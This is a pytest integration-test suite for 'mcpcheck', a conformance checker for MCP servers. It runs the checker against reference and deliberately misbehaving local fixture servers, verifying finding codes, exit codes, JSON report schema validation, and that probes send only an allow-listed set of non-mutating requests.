"""Integration and safety tests over real uvicorn servers (PLAN.md section 10.6).

Everything here drives the *full* runner (``run_checks`` with every check selected, or
the CLI in a subprocess) against the TCP fixture servers from ``tests/conftest.py``:

* acceptance: the SDK reference server passes every check in both response modes and
  under every ``--probe`` / ``--legacy-probes`` combination that must stay green;
* the section 10.4 expected-results table, one misbehaving toggle per row, asserting the
  check's status, the primary finding code and its normative level;
* safety: the misbehaving server's request log proves that a default run sends only the
  section 4 allow-list, that ``--legacy-probes`` adds exactly one ``initialize`` and one
  ``GET``, and that the unannotated tool is never called under ``--probe safe`` and only
  with schema-invalid arguments under ``--probe all``;
* environment rows (401, refused port, TLS to a plain server, endless SSE, slow server);
* the CLI end to end (exit codes 0/1/2, ``--strict``, ``--json`` validated against the
  shipped schema, ``--output``, token never leaking).

Servers are bound to ``127.0.0.1:0``; a misbehaving server is started per row and stopped
right after it so no fixture thread outlives its test.
"""

from __future__ import annotations

import contextlib
import json
import os
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any

import pytest
from jsonschema import Draft202012Validator

from mcpcheck.__main__ import shipped_schema_text
from mcpcheck.checks import NAMES, codes, select
from mcpcheck.checks.protocol import UNKNOWN_METHOD
from mcpcheck.client import ClientConfig
from mcpcheck.models import Era, Level, Status
from mcpcheck.runner import run_checks
from mcpcheck.wire import UNKNOWN_TOOL_NAME
from tests.conftest import ThreadServer, fetch_request_log, start_misbehaving_server
from tests.fixtures import reference_server
from tests.fixtures.misbehaving_server import CATALOGUE_TOOLS, DEFAULT_TOOLS, Toggles

if TYPE_CHECKING:
    from collections.abc import Callable, Iterator

    from mcpcheck.models import CheckResult, Finding, Report

pytestmark = pytest.mark.integration

LIST_METHODS = ("tools/list", "prompts/list", "resources/list", "resources/templates/list")
ALLOWED_PAIRS: frozenset[tuple[str, str | None]] = frozenset(
    {("POST", m) for m in (*LIST_METHODS, "server/discover", "tools/call", UNKNOWN_METHOD)}
    | {("OPTIONS", None)}
)
"""The PLAN.md section 4 allow-list as the misbehaving server's ``/__log`` records it."""
LEGACY_PAIRS: frozenset[tuple[str, str | None]] = frozenset({("GET", None), ("POST", "initialize")})
"""What ``--legacy-probes`` adds, and nothing else."""
NEVER_METHODS = frozenset(
    {
        "initialize",
        "resources/read",
        "resources/subscribe",
        "resources/unsubscribe",
        "prompts/get",
        "subscriptions/listen",
        "logging/setLevel",
        "completion/complete",
        "ping",
    }
)
NEVER_VERBS = frozenset({"DELETE", "PUT", "PATCH", "HEAD"})
TOKEN = "sekret-123"
SERVER_ORIGIN = "<server-origin>"
"""Placeholder in ``Row.cfg`` for the started server's own origin."""
CLI_TIMEOUT_S = 60
KNOWN_TOOLS: dict[str, dict[str, Any]] = {t["name"]: t for t in (*DEFAULT_TOOLS, *CATALOGUE_TOOLS)}


# --------------------------------------------------------------------------- helpers


@contextlib.contextmanager
def misbehaving(toggles: Toggles = Toggles()) -> Iterator[ThreadServer]:  # noqa: B008 - frozen default
    """Start a misbehaving server for ``toggles`` and stop it when the block ends."""
    server = start_misbehaving_server(toggles)
    try:
        yield server
    finally:
        server.stop()


async def run_all(url: str, *, checks: tuple[str, ...] = (), **cfg: Any) -> Report:
    """Run the selected checks (default: all eight) against ``url``."""
    return await run_checks(ClientConfig(url=url, **cfg), select(checks))


def result_of(report: Report, name: str) -> CheckResult:
    """The result row of check ``name``."""
    return next(r for r in report.checks if r.name.value == name)


def findings_of(result: CheckResult) -> list[Finding]:
    """Failures and warnings of a result (the status-bearing findings)."""
    return [*result.failures, *result.warnings]


def codes_of(result: CheckResult) -> set[str]:
    return {f.code for f in findings_of(result)}


def info_codes_of(result: CheckResult) -> set[str]:
    return {f.code for f in result.info}


def assert_all_pass(report: Report) -> None:
    """The section 10.4 acceptance criterion."""
    assert [r.status for r in report.checks] == [Status.PASS] * len(NAMES), [
        (r.name.value, r.status.value, r.summary) for r in report.checks
    ]
    assert report.summary.exit_code == 0
    assert report.summary.failed == 0
    assert report.summary.warned == 0
    assert report.summary.passed == len(NAMES)
    assert all(not r.failures and not r.warnings for r in report.checks)


def schema_validator() -> Draft202012Validator:
    return Draft202012Validator(json.loads(shipped_schema_text()))


def validate_report_json(text: str) -> dict[str, Any]:
    """Parse ``text`` and validate it against the shipped ``report.v1.json``."""
    data = json.loads(text)
    assert isinstance(data, dict)
    assert next(iter(data)) == "$schema"
    schema_validator().validate(data)
    return data


def cli(*args: str, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    """Run ``python -m mcpcheck`` with a clean environment (no colour, no inherited token)."""
    full_env = {**os.environ, "NO_COLOR": "1", "PYTHONIOENCODING": "utf-8", **(env or {})}
    if env is None or "MCPCHECK_TOKEN" not in env:
        full_env.pop("MCPCHECK_TOKEN", None)
    return subprocess.run(  # noqa: S603 - fixed argv, our own module
        [sys.executable, "-m", "mcpcheck", *args],
        check=False,
        capture_output=True,
        text=True,
        encoding="utf-8",
        env=full_env,
        timeout=CLI_TIMEOUT_S,
    )


def tool_calls(entries: list[dict[str, Any]]) -> list[tuple[str, Any]]:
    """``(tool name, arguments)`` for every ``tools/call`` in a request log."""
    out: list[tuple[str, Any]] = []
    for entry in entries:
        if entry["method"] != "tools/call":
            continue
        params = entry["body"]["params"]
        out.append((params["name"], params.get("arguments")))
    return out


def is_schema_valid(tool_name: str, arguments: Any) -> bool:
    schema = KNOWN_TOOLS[tool_name]["inputSchema"]
    return bool(Draft202012Validator(schema).is_valid(arguments))


def assert_allow_list(entries: list[dict[str, Any]], *, legacy: bool = False) -> None:
    """Every request in ``entries`` is in the section 4 allow-list (plus the legacy pair)."""
    assert entries, "the request log is empty"
    pairs = {(e["verb"], e["method"]) for e in entries}
    allowed = ALLOWED_PAIRS | LEGACY_PAIRS if legacy else ALLOWED_PAIRS
    assert pairs <= allowed, pairs - allowed
    assert not {e["verb"] for e in entries} & NEVER_VERBS
    assert not {e["method"] for e in entries} & (
        NEVER_METHODS - ({"initialize"} if legacy else set())
    )
    assert {e["path"] for e in entries} == {"/mcp"}, "no request may leave the MCP endpoint"
    for name, arguments in tool_calls(entries):
        if name == UNKNOWN_TOOL_NAME:
            continue
        assert name in KNOWN_TOOLS, name
        assert not is_schema_valid(name, arguments), (name, arguments)


# --------------------------------------------------------------------------- acceptance


@pytest.mark.anyio
@pytest.mark.parametrize("mode", ["sse", "json"])
@pytest.mark.parametrize(
    ("probe", "legacy_probes"),
    [("safe", False), ("all", False), ("safe", True), ("all", True)],
    ids=["probe-safe", "probe-all", "safe+legacy", "all+legacy"],
)
async def test_acceptance_reference_all_pass(
    request: pytest.FixtureRequest, mode: str, probe: str, legacy_probes: bool
) -> None:
    url: str = request.getfixturevalue("reference_url" if mode == "sse" else "reference_url_json")
    report = await run_all(url, probe=probe, legacy_probes=legacy_probes)
    assert_all_pass(report)
    assert report.protocol_version == "2026-07-28"
    assert report.server_supported_versions == ["2026-07-28"]
    assert report.server_info is not None
    assert report.server_info["name"] == reference_server.SERVER_NAME
    assert report.era is (Era.DUAL_ERA if legacy_probes else Era.UNKNOWN)
    assert report.options.probe == probe
    assert report.options.legacy_probes is legacy_probes
    # Only the opt-in probe yields the dual-era observation.
    assert ("handshake.dual_era" in info_codes_of(result_of(report, "handshake"))) is legacy_probes
    # The cache check discloses that resources/read is never probed (info only, status pass).
    assert "cache.resources_read_not_probed" in info_codes_of(result_of(report, "cache"))


@pytest.mark.anyio
async def test_stateful_reference_passes(reference_url_factory: Callable[..., str]) -> None:
    """A dual-era SDK server (legacy path keeps sessions) never fails a check (exit 0)."""
    url = reference_url_factory(stateless_http=False)
    report = await run_all(url, legacy_probes=True)
    statuses = {r.name.value: r.status for r in report.checks}
    assert Status.FAIL not in statuses.values(), statuses
    assert Status.ERROR not in statuses.values(), statuses
    assert report.summary.exit_code == 0
    assert report.era is Era.DUAL_ERA
    assert statuses["handshake"] is Status.PASS
    assert "handshake.session_id_seen" in info_codes_of(result_of(report, "handshake"))
    assert statuses["session"] is Status.PASS, result_of(report, "session").summary
    assert statuses["protocol"] is Status.PASS, result_of(report, "protocol").summary
    assert statuses["discover"] is Status.PASS
    assert statuses["schemas"] is Status.PASS
    assert statuses["errors"] is Status.PASS
    assert statuses["cache"] is Status.PASS
    assert statuses["origin"] is Status.PASS


@pytest.mark.anyio
async def test_probe_none_makes_errors_inconclusive_and_sends_no_tools_call() -> None:
    with misbehaving() as server:
        report = await run_all(server.url, probe="none")
        entries = fetch_request_log(server.url)
    assert result_of(report, "errors").status is Status.INCONCLUSIVE
    assert report.summary.exit_code == 0
    assert all(r.status is Status.PASS for r in report.checks if r.name.value != "errors")
    assert not tool_calls(entries)
    assert_allow_list(entries)


@pytest.mark.anyio
async def test_sse_server_all_pass() -> None:
    """Section 10.4 row ``sse=True`` alone: every check passes over text/event-stream."""
    with misbehaving(Toggles(sse=True)) as server:
        report = await run_all(server.url)
    assert_all_pass(report)


# --------------------------------------------------------------------------- section 10.4 table


@dataclass(frozen=True)
class Row:
    """One row of the PLAN.md section 10.4 expected-results table."""

    id: str
    toggles: Toggles
    check: str
    status: Status
    codes: tuple[str, ...] = ()
    """Expected in ``failures + warnings``; ``codes[0]`` is the primary finding."""
    level: Level | None = None
    """Normative level of the primary finding (the table's Status/level column)."""
    info: tuple[str, ...] = ()
    cfg: dict[str, Any] = field(default_factory=dict)
    only: tuple[str, ...] = ()
    """``--check`` selection; empty = full default run."""


def _tool(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "name": "probe_me",
        "description": "Row fixture tool.",
        "inputSchema": {
            "type": "object",
            "properties": {"q": {"type": "string"}},
            "required": ["q"],
        },
        "outputSchema": {"type": "object"},
        "annotations": {"readOnlyHint": True},
    }
    base.update(overrides)
    for key in [k for k, v in overrides.items() if v is ...]:
        del base[key]
    return base


ROWS: tuple[Row, ...] = (
    Row(
        "require_initialize",
        Toggles(require_initialize=True),
        "handshake",
        Status.FAIL,
        ("handshake.initialize_required",),
        Level.MUST,
    ),
    Row(
        "legacy_shape",
        Toggles(legacy_shape=True),
        "handshake",
        Status.FAIL,
        ("handshake.legacy_shaped_result",),
        Level.MUST,
    ),
    # In a full run the handshake gate blocks every dependent (see the combination test),
    # so the session row is asserted with ``--check session`` as its own primary.
    Row(
        "require_session_id",
        Toggles(require_session_id=True),
        "session",
        Status.FAIL,
        ("session.required", "session.bogus_id_rejected"),
        Level.MUST,
        only=("session",),
    ),
    Row(
        "mint_session_id",
        Toggles(mint_session_id=True),
        "session",
        Status.WARN,
        ("session.session_id_minted",),
        Level.SHOULD,
    ),
    Row(
        "echo_session_id",
        Toggles(echo_session_id=True),
        "session",
        Status.WARN,
        ("session.session_id_echoed",),
        Level.SHOULD,
    ),
    Row(
        "vary_tools_per_connection",
        Toggles(vary_tools_per_connection=True),
        "session",
        Status.FAIL,
        ("session.list_varies_per_connection",),
        Level.MUST,
    ),
    Row(
        "vary_tools_per_request",
        Toggles(vary_tools_per_request=True),
        "session",
        Status.FAIL,
        ("session.list_varies_within_connection", "session.list_varies_with_session_header"),
        Level.MUST,
    ),
    Row(
        "nondeterministic_order",
        Toggles(nondeterministic_order=True),
        "session",
        Status.WARN,
        ("session.order_not_deterministic",),
        Level.SHOULD,
    ),
    Row(
        "no_discover",
        Toggles(no_discover=True),
        "discover",
        Status.FAIL,
        ("discover.not_implemented",),
        Level.MUST,
    ),
    Row(
        "discover_no_server_info",
        Toggles(discover_no_server_info=True),
        "discover",
        Status.WARN,
        ("discover.server_info_missing",),
        Level.SHOULD,
    ),
    Row(
        "discover_wrong_versions",
        Toggles(discover_wrong_versions=True),
        "discover",
        Status.WARN,
        ("discover.supported_versions_omit_served",),
        Level.BEST_PRACTICE,
    ),
    Row(
        "capability_mismatch",
        Toggles(capability_mismatch=True),
        "discover",
        Status.FAIL,
        ("discover.capability_undeclared",),
        Level.MUST,
    ),
    Row(
        "discover_variant=no-hints",
        Toggles(discover_variant="no-hints"),
        "discover",
        Status.FAIL,
        ("discover.ttl_missing", "discover.scope_missing"),
        Level.MUST,
    ),
    Row(
        "inputSchema=null",
        Toggles(tools=(_tool(inputSchema=None),)),
        "schemas",
        Status.FAIL,
        ("schemas.input_schema_not_object",),
        Level.MUST,
    ),
    Row(
        "inputSchema={}",
        Toggles(tools=(_tool(inputSchema={}),)),
        "schemas",
        Status.FAIL,
        ("schemas.input_schema_type",),
        Level.MUST,
    ),
    Row(
        "inputSchema={required:a}",
        Toggles(tools=(_tool(inputSchema={"required": "a"}),)),
        "schemas",
        Status.FAIL,
        ("schemas.input_schema_invalid",),
        Level.MUST,
    ),
    Row(
        "no outputSchema",
        Toggles(tools=(_tool(outputSchema=...),)),
        "schemas",
        Status.WARN,
        ("schemas.output_schema_missing",),
        Level.BEST_PRACTICE,
    ),
    Row(
        "outputSchema={}",
        Toggles(tools=(_tool(outputSchema={}),)),
        "schemas",
        Status.WARN,
        ("schemas.output_schema_permissive",),
        Level.BEST_PRACTICE,
    ),
    Row(
        "bad x-mcp-header",
        Toggles(
            tools=(
                _tool(
                    inputSchema={
                        "type": "object",
                        "properties": {"amount": {"type": "number", "x-mcp-header": "Amount"}},
                    }
                ),
            )
        ),
        "schemas",
        Status.FAIL,
        ("schemas.x_mcp_header_invalid",),
        Level.MUST,
    ),
    Row(
        "error_style=traceback",
        Toggles(error_style="traceback"),
        "errors",
        Status.WARN,
        ("errors.non_actionable_messages",),
        Level.BEST_PRACTICE,
    ),
    Row(
        "error_style=bare",
        Toggles(error_style="bare"),
        "errors",
        Status.WARN,
        ("errors.non_actionable_messages",),
        Level.BEST_PRACTICE,
    ),
    Row("error_style=jsonrpc", Toggles(error_style="jsonrpc"), "errors", Status.PASS),
    Row(
        "error_style=success",
        Toggles(error_style="success"),
        "errors",
        Status.FAIL,
        ("errors.accepted_invalid_input",),
        Level.MUST,
    ),
    Row(
        "omit_ttl", Toggles(omit_ttl=True), "cache", Status.FAIL, ("cache.ttl_missing",), Level.MUST
    ),
    Row(
        "omit_cache_scope",
        Toggles(omit_cache_scope=True),
        "cache",
        Status.FAIL,
        ("cache.scope_missing",),
        Level.MUST,
    ),
    Row(
        "negative_ttl",
        Toggles(negative_ttl=True),
        "cache",
        Status.FAIL,
        ("cache.ttl_negative",),
        Level.MUST,
    ),
    Row(
        "float_ttl=60000.0",
        Toggles(float_ttl=60000.0),
        "cache",
        Status.WARN,
        ("cache.ttl_integral_float",),
        Level.BEST_PRACTICE,
    ),
    Row(
        "float_ttl=1.5",
        Toggles(float_ttl=1.5),
        "cache",
        Status.WARN,
        ("cache.ttl_not_integral",),
        Level.SHOULD,
    ),
    Row(
        "prompts_without_name",
        Toggles(prompts=({"nme": "summarize", "arguments": "not-a-list"},)),
        "cache",
        Status.FAIL,
        ("cache.item_malformed",),
        Level.MUST,
    ),
    Row(
        "resources_without_uri",
        Toggles(resources=({"name": "greeting", "mimeType": 7},)),
        "cache",
        Status.FAIL,
        ("cache.item_malformed",),
        Level.MUST,
    ),
    Row(
        "ignore_mcp_name",
        Toggles(ignore_mcp_name=True),
        "protocol",
        Status.FAIL,
        ("protocol.missing_mcp_name_accepted", "protocol.name_header_mismatch_accepted"),
        Level.MUST,
    ),
    Row(
        "cache_scope=user",
        Toggles(cache_scope="user"),
        "cache",
        Status.FAIL,
        ("cache.scope_invalid",),
        Level.MUST,
    ),
    Row(
        "scope_varies_across_pages",
        Toggles(scope_varies_across_pages=True),
        "cache",
        Status.FAIL,
        ("cache.scope_inconsistent_pages",),
        Level.MUST,
    ),
    Row(
        "user_specific_public+token",
        Toggles(user_specific_public=True),
        "cache",
        Status.WARN,
        ("cache.public_user_specific_names",),
        Level.BEST_PRACTICE,
        cfg={"token": TOKEN},
    ),
    Row(
        "origin_mode=accept_all",
        Toggles(origin_mode="accept_all"),
        "origin",
        Status.FAIL,
        ("origin.evil_accepted",),
        Level.MUST,
    ),
    Row(
        "origin_mode=reject_400_jsonrpc",
        Toggles(origin_mode="reject_400_jsonrpc"),
        "origin",
        Status.FAIL,
        ("origin.evil_rejected_wrong_status",),
        Level.MUST,
    ),
    # Reachable only with --origin: otherwise the header-less gate request is refused.
    Row(
        "origin_mode=require_origin",
        Toggles(origin_mode="require_origin"),
        "origin",
        Status.WARN,
        ("origin.no_origin_rejected",),
        Level.BEST_PRACTICE,
        cfg={"origin": SERVER_ORIGIN},
    ),
    Row(
        "ignore_version_mismatch",
        Toggles(ignore_version_mismatch=True),
        "protocol",
        Status.FAIL,
        ("protocol.header_mismatch_accepted",),
        Level.MUST,
    ),
    # Protocol author's correction of the plan's row: a 2025-shaped answer to a
    # header-less request is the dual-era MAY (info), exactly what the SDK itself does.
    Row(
        "serve_headerless_as_legacy",
        Toggles(serve_headerless_as_legacy=True),
        "protocol",
        Status.PASS,
        info=("protocol.dual_era_server",),
    ),
    Row(
        "unknown_method_status=200",
        Toggles(unknown_method_status=200),
        "protocol",
        Status.FAIL,
        ("protocol.unknown_method_wrong_status",),
        Level.MUST,
    ),
    Row(
        "legacy_error_codes",
        Toggles(legacy_error_codes=True),
        "protocol",
        Status.FAIL,
        (
            "protocol.forbidden_error_code",
            "protocol.unknown_method_not_jsonrpc",
            "protocol.invalid_cursor_not_rejected",
        ),
        Level.MUST,
    ),
    Row(
        "accept_missing_meta",
        Toggles(accept_missing_meta=True),
        "protocol",
        Status.FAIL,
        ("protocol.missing_meta_accepted",),
        Level.MUST,
    ),
    Row(
        "sse+no_x_accel_buffering/discover",
        Toggles(sse=True, x_accel_buffering=False),
        "discover",
        Status.WARN,
        ("discover.no_accel_buffering_header",),
        Level.SHOULD,
    ),
    Row(
        "sse+no_x_accel_buffering/protocol",
        Toggles(sse=True, x_accel_buffering=False),
        "protocol",
        Status.WARN,
        ("protocol.no_accel_buffering_header",),
        Level.SHOULD,
    ),
)


def _resolve_cfg(row: Row, server: ThreadServer) -> dict[str, Any]:
    return {k: (server.origin if v == SERVER_ORIGIN else v) for k, v in row.cfg.items()}


@pytest.mark.anyio
@pytest.mark.parametrize("row", [pytest.param(row, id=row.id) for row in ROWS])
async def test_expected_results_table(row: Row) -> None:
    with misbehaving(row.toggles) as server:
        report = await run_all(server.url, checks=row.only, **_resolve_cfg(row, server))
    result = result_of(report, row.check)
    assert result.status is row.status, (result.status, result.summary, codes_of(result))
    found = codes_of(result)
    for code in row.codes:
        assert code in found, (code, found)
        registered = codes.lookup(code)
        for finding in findings_of(result):
            if finding.code == code:
                assert finding.level is registered.level, (code, finding.level)
                assert finding.spec_url is not None or finding.level is Level.BEST_PRACTICE
    if row.codes:
        primary = next(f for f in findings_of(result) if f.code == row.codes[0])
        assert primary.level is row.level, (row.codes[0], primary.level)
        assert result.severity is not None
    for code in row.info:
        assert code in info_codes_of(result), (code, info_codes_of(result))
    if row.status is Status.PASS:
        assert not found
        assert result.severity is None
    assert result.passed is (row.status is not Status.FAIL)
    assert report.summary.exit_code == (1 if row.status is Status.FAIL else 0), [
        (r.name.value, r.status.value, r.summary) for r in report.checks
    ]
    assert report.summary.total == len(row.only or NAMES)


@pytest.mark.anyio
async def test_combination_require_initialize_blocks_dependents() -> None:
    with misbehaving(Toggles(require_initialize=True)) as server:
        report = await run_all(server.url)
    handshake = result_of(report, "handshake")
    assert handshake.status is Status.FAIL
    assert "handshake.initialize_required" in codes_of(handshake)
    assert report.era is Era.LEGACY_ONLY
    for result in report.checks[1:]:
        assert result.status is Status.INCONCLUSIVE, result
        assert "runner.not_run" in info_codes_of(result)
        assert result.summary.startswith("Not run:")
        assert result.requests == 0
    assert report.summary.exit_code == 1
    assert report.summary.failed == 1
    assert report.summary.inconclusive == len(NAMES) - 1


@pytest.mark.anyio
async def test_strict_promotes_best_practice_warning_to_exit_1() -> None:
    toggles = Toggles(tools=(_tool(outputSchema=...),))
    with misbehaving(toggles) as server:
        lenient = await run_all(server.url)
        strict = await run_all(server.url, strict=True)
    for report, exit_code in ((lenient, 0), (strict, 1)):
        schemas = result_of(report, "schemas")
        assert schemas.status is Status.WARN
        assert "schemas.output_schema_missing" in codes_of(schemas)
        assert report.summary.exit_code == exit_code
        assert schemas.passed is (exit_code == 0)
    assert strict.options.strict is True
    assert lenient.options.strict is False


# --------------------------------------------------------------------------- safety


@pytest.mark.anyio
async def test_request_log_contains_only_allowed_requests() -> None:
    """A default run sends only the section 4 allow-list; nothing can execute or mutate."""
    with misbehaving() as server:
        report = await run_all(server.url)
        entries = fetch_request_log(server.url)
    assert_all_pass(report)
    assert_allow_list(entries)
    pairs = {(e["verb"], e["method"]) for e in entries}
    # Every allowed kind is actually exercised by the default run.
    assert pairs == ALLOWED_PAIRS, pairs ^ ALLOWED_PAIRS
    assert ("GET", None) not in pairs
    assert "initialize" not in {e["method"] for e in entries}
    names = [name for name, _ in tool_calls(entries)]
    # errors calls the unknown tool once; protocol probes 11-13 call it three more times
    assert sorted(names) == sorted([*(t["name"] for t in DEFAULT_TOOLS), *[UNKNOWN_TOOL_NAME] * 4])
    # No credentials were sent because none were configured.
    assert all("authorization" not in e["headers"] for e in entries)
    # The protocol check's unknown-method probe is the only non-list, non-call method.
    assert sum(1 for e in entries if e["method"] == UNKNOWN_METHOD) == 1


@pytest.mark.anyio
async def test_legacy_probes_adds_initialize_and_get_only() -> None:
    with misbehaving() as server:
        report = await run_all(server.url, legacy_probes=True)
        entries = fetch_request_log(server.url)
    assert report.summary.exit_code == 0
    assert_allow_list(entries, legacy=True)
    pairs = {(e["verb"], e["method"]) for e in entries}
    assert pairs - ALLOWED_PAIRS == LEGACY_PAIRS
    gets = [e for e in entries if e["verb"] == "GET"]
    inits = [e for e in entries if e["method"] == "initialize"]
    assert len(gets) == 1
    assert len(inits) == 1
    # The GET is a headers-only hazard probe carrying the 2026 version header.
    assert gets[0]["headers"]["mcp-protocol-version"] == "2026-07-28"
    assert "text/event-stream" in gets[0]["headers"]["accept"]
    assert gets[0]["body"] is None
    # The legacy initialize is header-less and names the last handshake-era version.
    assert "mcp-protocol-version" not in inits[0]["headers"]
    assert inits[0]["body"]["params"]["protocolVersion"] == "2025-11-25"
    assert "DELETE" not in {e["verb"] for e in entries}


@pytest.mark.anyio
async def test_probe_safe_never_calls_unannotated_tool() -> None:
    """``--probe safe`` (default): ``destructive_norequired`` carries no annotations → never called."""
    # timeout=1: the catalogue's ``slow`` tool answers after 5 s; its probe is cut at the
    # per-request budget, which does not affect which tools get called.
    with misbehaving(Toggles(error_shapes_catalogue=True)) as server:
        report = await run_all(server.url, max_tools=50, timeout=1.0)
        entries = fetch_request_log(server.url)
    assert_allow_list(entries)
    called = {name for name, _ in tool_calls(entries)} - {UNKNOWN_TOOL_NAME}
    assert "destructive_norequired" not in called
    assert "readonly_permissive" not in called, "a permissive schema has no provable invalid input"
    assert called, "the annotated catalogue tools are probed"
    for name in called:
        annotations = KNOWN_TOOLS[name].get("annotations") or {}
        assert (
            annotations.get("readOnlyHint") is True or annotations.get("destructiveHint") is False
        ), name
    errors = result_of(report, "errors")
    skipped = {f.tool or f.subject for f in errors.info if f.code == "errors.tool_skipped"}
    assert any("destructive_norequired" in s for s in skipped), skipped


@pytest.mark.anyio
async def test_probe_all_calls_unannotated_tool_only_with_invalid_arguments() -> None:
    with misbehaving(Toggles(error_shapes_catalogue=True)) as server:
        report = await run_all(server.url, probe="all", max_tools=50, timeout=1.0)
        entries = fetch_request_log(server.url)
    assert report.options.probe == "all"
    assert_allow_list(entries)  # includes: every tools/call payload is schema-invalid
    calls = [(name, args) for name, args in tool_calls(entries) if name == "destructive_norequired"]
    assert len(calls) == 1, calls
    name, arguments = calls[0]
    assert isinstance(arguments, dict)
    assert not is_schema_valid(name, arguments), arguments
    assert is_schema_valid(name, {}), "sanity: the tool accepts an empty object"
    # Under --probe all the hdr_tool is probed twice: by errors and by the protocol
    # Mcp-Param-* omission probe; both payloads are invalid (checked by assert_allow_list).
    assert sum(1 for n, _ in tool_calls(entries) if n == "hdr_tool") == 2
    assert "destructive_norequired" not in {
        f.tool or f.subject
        for f in result_of(report, "errors").info
        if f.code == "errors.tool_skipped"
    }


# --------------------------------------------------------------------------- environment rows


@pytest.mark.anyio
@pytest.mark.parametrize("strict", [False, True], ids=["lenient", "strict"])
async def test_env_401_every_check_inconclusive(strict: bool) -> None:
    with misbehaving(Toggles(status=401)) as server:
        report = await run_all(server.url, strict=strict)
    assert all(r.status is Status.INCONCLUSIVE for r in report.checks)
    assert "--token" in result_of(report, "handshake").summary
    assert report.summary.exit_code == (1 if strict else 0)
    assert report.summary.inconclusive == len(NAMES)


@pytest.mark.anyio
async def test_env_connection_refused_all_error_exit_2() -> None:
    t0 = time.perf_counter()
    report = await run_all("http://127.0.0.1:1/mcp", timeout=2)
    elapsed = time.perf_counter() - t0
    assert all(r.status is Status.ERROR for r in report.checks)
    assert report.summary.exit_code == 2
    assert report.summary.errored == len(NAMES)
    assert elapsed < 2.0, elapsed
    handshake = result_of(report, "handshake")
    assert handshake.error is not None
    assert handshake.error.type == "ServerUnreachable"


@pytest.mark.anyio
async def test_env_tls_to_plain_server_is_an_error_not_a_crash(reference_url: str) -> None:
    url = reference_url.replace("http://", "https://", 1)
    report = await run_all(url, timeout=2)
    assert all(r.status is Status.ERROR for r in report.checks)
    assert report.summary.exit_code == 2
    error = result_of(report, "handshake").error
    assert error is not None
    assert error.type == "ServerUnreachable"
    assert url in error.message


@pytest.mark.anyio
@pytest.mark.slow
async def test_env_endless_sse_never_hangs() -> None:
    timeout = 0.5
    with misbehaving(Toggles(endless_sse=True)) as server:
        t0 = time.perf_counter()
        report = await run_all(server.url, timeout=timeout)
        elapsed = time.perf_counter() - t0
    assert elapsed < 10 * timeout, elapsed
    assert {r.status for r in report.checks} <= {Status.INCONCLUSIVE, Status.ERROR}
    assert "budget" in result_of(report, "handshake").summary


@pytest.mark.anyio
@pytest.mark.slow
async def test_env_slow_server_inconclusive_quickly() -> None:
    with misbehaving(Toggles(slow_seconds=2)) as server:
        t0 = time.perf_counter()
        report = await run_all(server.url, timeout=0.5)
        elapsed = time.perf_counter() - t0
    assert result_of(report, "handshake").status is Status.INCONCLUSIVE
    assert all(r.status is Status.INCONCLUSIVE for r in report.checks)
    assert elapsed < 2.0, elapsed
    assert report.summary.exit_code == 0


def test_no_fixture_thread_survives_a_stopped_server() -> None:
    def fixture_threads() -> set[int]:
        return {t.ident or 0 for t in threading.enumerate() if t.name == "uvicorn-fixture"}

    before = fixture_threads()
    server = start_misbehaving_server(Toggles())
    started = fixture_threads() - before
    assert len(started) == 1
    assert server.port > 0
    server.stop()
    assert fixture_threads() == before
    assert not server.running


# --------------------------------------------------------------------------- CLI end to end


def test_cli_reference_exit_0(reference_url: str) -> None:
    proc = cli(reference_url)
    assert proc.returncode == 0, proc.stderr
    assert "All 8 checks passed" in proc.stdout
    assert reference_url in proc.stdout
    assert (
        f"server: {reference_server.SERVER_NAME} {reference_server.SERVER_VERSION}" in proc.stdout
    )
    for name in NAMES:
        assert name in proc.stdout
    assert proc.stderr == ""


def test_cli_misbehaving_exit_1() -> None:
    with misbehaving(Toggles(omit_ttl=True)) as server:
        proc = cli(server.url)
    assert proc.returncode == 1, proc.stdout
    assert "cache" in proc.stdout
    assert "ttlMs" in proc.stdout
    assert "1 of 8 checks failed" in proc.stdout


def test_cli_unreachable_exit_2() -> None:
    t0 = time.perf_counter()
    proc = cli("http://127.0.0.1:1/mcp", "--timeout", "2")
    assert time.perf_counter() - t0 < 20
    assert proc.returncode == 2, proc.stdout
    assert "ConnectError" in proc.stdout or "unreachable" in proc.stdout.lower()


def test_cli_bad_url_exit_2() -> None:
    proc = cli("not-a-url")
    assert proc.returncode == 2
    assert proc.stdout == ""
    assert "SERVER_URL" in proc.stderr
    assert "http://" in proc.stderr


def test_cli_strict_promotes_warning_to_exit_1() -> None:
    with misbehaving(Toggles(float_ttl=60000.0)) as server:
        lenient = cli(server.url)
        strict = cli(server.url, "--strict")
    assert lenient.returncode == 0, lenient.stdout
    assert strict.returncode == 1, strict.stdout
    assert "cache" in strict.stdout
    assert "1 warning" in lenient.stdout


def test_cli_json_validates_against_shipped_schema(reference_url: str) -> None:
    proc = cli(reference_url, "--json")
    assert proc.returncode == 0, proc.stderr
    data = validate_report_json(proc.stdout)
    assert data["server"] == reference_url
    assert data["summary"]["exit_code"] == 0
    assert [c["status"] for c in data["checks"]] == ["pass"] * len(NAMES)
    assert [c["name"] for c in data["checks"]] == list(NAMES)
    assert data["request"] == {
        "origin": None,
        "auth": "none",
        "extra_headers": [],
        "tls_verify": True,
    }
    assert data["options"]["probe"] == "safe"
    assert proc.stderr == ""


def test_cli_json_failure_report_validates() -> None:
    with misbehaving(Toggles(origin_mode="accept_all")) as server:
        proc = cli(server.url, "--json")
    assert proc.returncode == 1
    data = validate_report_json(proc.stdout)
    origin = next(c for c in data["checks"] if c["name"] == "origin")
    assert origin["status"] == "fail"
    assert origin["passed"] is False
    assert origin["severity"] == "must"
    assert {f["code"] for f in origin["failures"]} == {"origin.evil_accepted"}
    assert data["summary"]["exit_code"] == 1


def test_cli_output_file_with_human_stdout(reference_url: str, tmp_path: Any) -> None:
    out = tmp_path / "report.json"
    proc = cli(reference_url, "--output", str(out))
    assert proc.returncode == 0, proc.stderr
    assert "All 8 checks passed" in proc.stdout
    data = validate_report_json(out.read_text(encoding="utf-8"))
    assert data["summary"]["exit_code"] == 0


def test_cli_output_file_with_json_stdout(reference_url: str, tmp_path: Any) -> None:
    out = tmp_path / "nested" / "report.json"
    out.parent.mkdir()
    proc = cli(reference_url, "--json", "-o", str(out))
    assert proc.returncode == 0, proc.stderr
    stdout_data = validate_report_json(proc.stdout)
    file_data = validate_report_json(out.read_text(encoding="utf-8"))
    assert file_data["checks"] == stdout_data["checks"]
